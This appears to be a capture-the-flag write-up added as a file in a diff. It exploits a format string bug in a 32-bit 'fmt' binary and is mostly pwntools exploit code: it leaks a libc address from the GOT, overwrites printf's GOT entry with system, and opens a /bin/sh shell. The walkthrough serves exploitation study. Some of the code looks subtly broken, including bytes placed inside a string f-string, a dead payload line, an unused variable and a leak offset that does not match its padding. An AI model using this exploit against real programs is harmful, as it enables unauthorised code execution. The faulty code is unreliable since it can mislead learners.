@@ -1,0 +1,205 @@
+To solve this challenge using pwntools, we'll exploit the format string vulnerability in the program to achieve arbitrary memory read and write. Here's a step-by-step guide with detailed explanations and code.
+
+**Challenge Analysis:**
+
+1. **Understanding the Vulnerability:**
+    - The program reads user input into a buffer and then calls `printf(buf);` without specifying a format string.
+    - This is a classic format string vulnerability, allowing us to read and write arbitrary memory by crafting special format strings.
+
+2. **Objective:**
+    - Leak a libc address to calculate the base address of libc.
+    - Use the base address to find the addresses of `system` and `"/bin/sh"`.
+    - Overwrite a Global Offset Table (GOT) entry with the address of `system`.
+    - Trigger a function call to get a shell.
+
+3. **Approach:**
+    - Use `%x` and `%s` format specifiers to leak memory addresses.
+    - Calculate the correct offset to our input on the stack.
+    - Use `%n` to perform arbitrary writes to overwrite a GOT entry.
+    - Since the program loops, we can perform multiple interactions.
+
+**Step-by-Step Solution:**
+
+1. **Setup the Environment:**
+
+   First, we need to set up our environment and load the necessary binaries.
+
+   ```python
+   from pwn import *
+
+   # Set pwntools context
+   context.arch = 'i386'
+   context.os = 'linux'
+   context.log_level = 'debug'  # Set to 'info' or 'debug' for more output
+
+   # Load the binary and libc
+   elf = ELF('./fmt')
+   libc = ELF('./libc.so.6')
+   ```
+
+2. **Start the Process:**
+
+   ```python
+   # Start the vulnerable program
+   p = process('./fmt')
+   ```
+
+3. **Identify GOT Entries:**
+
+   We'll target a function that's called after our overwrite. Since `printf` is used in the loop, we'll overwrite its GOT entry.
+
+   ```python
+   # Get the GOT address of printf
+   printf_got = elf.got['printf']
+   log.info(f"printf GOT address: {hex(printf_got)}")
+   ```
+
+4. **Leak a libc Address:**
+
+   Use the format string vulnerability to leak the address of `printf` from the GOT.
+
+   ```python
+   # Wait for the initial prompt
+   p.recvuntil('Do you know repeater?')
+
+   # Craft payload to leak printf address
+   payload = fmtstr_payload(offset=4, writes={}, write_size='byte')
+   payload = f"{'%4$s'.ljust(8)}{p32(printf_got)}"
+   p.sendline(payload)
+
+   # Receive and parse the leaked address
+   p.recvuntil('Do you know repeater?\n')
+   leaked_data = p.recv(4)
+   leaked_printf = u32(leaked_data)
+   log.success(f"Leaked printf address: {hex(leaked_printf)}")
+   ```
+
+   **Explanation:**
+
+   - `%4$s` reads a string from the stack at position 4.
+   - We provide the address of `printf_got` right after the format string.
+   - The program will print the string located at `printf_got`, which is the actual address of `printf` in libc.
+
+5. **Calculate libc Base Address:**
+
+   ```python
+   # Calculate libc base
+   libc_base = leaked_printf - libc.symbols['printf']
+   log.success(f"Calculated libc base address: {hex(libc_base)}")
+   ```
+
+6. **Find `system` and `"/bin/sh"` Addresses:**
+
+   ```python
+   # Calculate system and "/bin/sh" addresses
+   system_addr = libc_base + libc.symbols['system']
+   bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+   log.info(f"system address: {hex(system_addr)}")
+   log.info(f"'/bin/sh' address: {hex(bin_sh_addr)}")
+   ```
+
+7. **Overwrite `printf` GOT Entry with `system`:**
+
+   We need to overwrite the GOT entry of `printf` with the address of `system`.
+
+   ```python
+   # Use fmtstr_payload to craft payload for arbitrary write
+   writes = {printf_got: system_addr}
+   payload = fmtstr_payload(offset=4, writes=writes, write_size='byte')
+   p.sendline(payload)
+   ```
+
+   **Explanation:**
+
+   - `fmtstr_payload` helps us create a format string that writes `system_addr` to `printf_got`.
+   - `offset` may need adjustment based on the stack layout.
+
+8. **Trigger the Overwritten Function:**
+
+   Now, when `printf` is called, it will actually call `system`.
+
+   ```python
+   # Send "/bin/sh" to trigger system("/bin/sh")
+   p.sendline(b'/bin/sh')
+   ```
+
+9. **Interact with the Shell:**
+
+   ```python
+   # Switch to interactive mode to interact with the shell
+   p.interactive()
+   ```
+
+10. **Full Exploit Script:**
+
+    Here's the complete script combining all the steps:
+
+    ```python
+    from pwn import *
+
+    context.arch = 'i386'
+    context.os = 'linux'
+    context.log_level = 'debug'
+
+    elf = ELF('./fmt')
+    libc = ELF('./libc.so.6')
+
+    p = process('./fmt')
+    printf_got = elf.got['printf']
+
+    p.recvuntil('Do you know repeater?')
+
+    # Step 1: Leak printf address
+    payload = f"{'%4$s'.ljust(8)}{p32(printf_got)}"
+    p.sendline(payload)
+    p.recvuntil('Do you know repeater?\n')
+    leaked_data = p.recv(4)
+    leaked_printf = u32(leaked_data)
+    log.success(f"Leaked printf address: {hex(leaked_printf)}")
+
+    # Step 2: Calculate libc base
+    libc_base = leaked_printf - libc.symbols['printf']
+    log.success(f"Calculated libc base address: {hex(libc_base)}")
+
+    # Step 3: Calculate system and "/bin/sh" addresses
+    system_addr = libc_base + libc.symbols['system']
+    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+    log.info(f"system address: {hex(system_addr)}")
+    log.info(f"'/bin/sh' address: {hex(bin_sh_addr)}")
+
+    # Step 4: Overwrite printf GOT entry
+    writes = {printf_got: system_addr}
+    payload = fmtstr_payload(offset=4, writes=writes, write_size='byte')
+    p.sendline(payload)
+
+    # Step 5: Trigger system("/bin/sh")
+    p.sendline(b'/bin/sh')
+
+    # Step 6: Get shell
+    p.interactive()
+    ```
+
+**Additional Notes:**
+
+- **Adjusting Offsets:**
+    - The `offset` parameter in `fmtstr_payload` and the format string (e.g., `%4$s`) depends on the number of arguments before our input reaches the stack.
+    - Use `%p` to print stack addresses and find the correct offset.
+
+- **Handling Repeated Prompts:**
+    - Since the program loops, make sure to handle the prompts correctly.
+    - Use `p.recvuntil()` to synchronize with the program's output.
+
+- **Debugging Tips:**
+    - Run the exploit with `gdb` to step through and inspect the memory.
+    - Use `context.log_level = 'debug'` for verbose output from pwntools.
+
+**Conclusion:**
+
+By exploiting the format string vulnerability, we successfully:
+
+- Leaked a libc address to calculate the base address.
+- Overwrote a GOT entry to redirect function calls to `system`.
+- Gained a shell by executing `system("/bin/sh")`.
+
+**Disclaimer:** Exploiting vulnerabilities should only be done in legal and ethical ways, such as in controlled environments or with proper authorization.
